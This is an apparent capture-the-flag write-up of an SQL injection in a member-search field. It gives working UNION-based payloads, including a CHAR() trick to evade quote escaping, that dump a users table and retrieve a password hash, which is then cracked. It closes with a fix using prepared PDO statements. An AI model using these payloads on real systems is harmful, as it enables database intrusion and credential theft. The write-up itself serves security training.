## How did we found it

Test if member search id input have sql injection breach with ```42 OR 1=1```. With this sql we found `Flag` as First name for the user id 5.
tried to find the user table with ```(SELECT * FROM table_name)```,
then search the columns names of the table with ```42 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=CHAR(117, 115, 101, 114, 115)```.
`CHAR(117, 115, 101, 114, 115)` correspond to `users` because we can't write `'users'`, the `'` and `"` char are escaped.
Then with ```42 UNION SELECT 1, (SELECT CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users WHERE user_id=5)``` we got a password.
We cracked password with `https://crackstation.net` and lowercase it, then encrypt it with sh256.

## How to fix it
In the backend, the sql request need to be prepared, in this case sql can't be injected
Don't print sql error message, print only column (by name) who is waited

## PHP exemple
### bad php

```
$conn = new mysqli("localhost", "username", "password", "database");
$result = $conn->query("SELECT * FROM users WHERE username = '$username'");
while($row = $result->fetch_assoc())
{
    echo "id: " . $row["id"]. " - Nom: " . $row["username"]. "<br>";
}
```

### good php

```
$bdd = new PDO ('mysql:host=HOST_SQL;dbname=NAME_DB;charset=utf8', 'SQL_USERNAME', 'SQLPASSWORD' , array(PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8'));
$req = $bdd->prepare("SELECT NAME_COLUMN_1, NAME_COLUMN_2 FROM `users` WHERE user_id LIKE ?");
$req->execute(array(htmlspecialchars($ID_USER_VAR)));
foreach ($req as $donnee)
{
	echo $donnee["NAME_COLUMN_1"];
	echo $donnee["NAME_COLUMN_2"];
}
```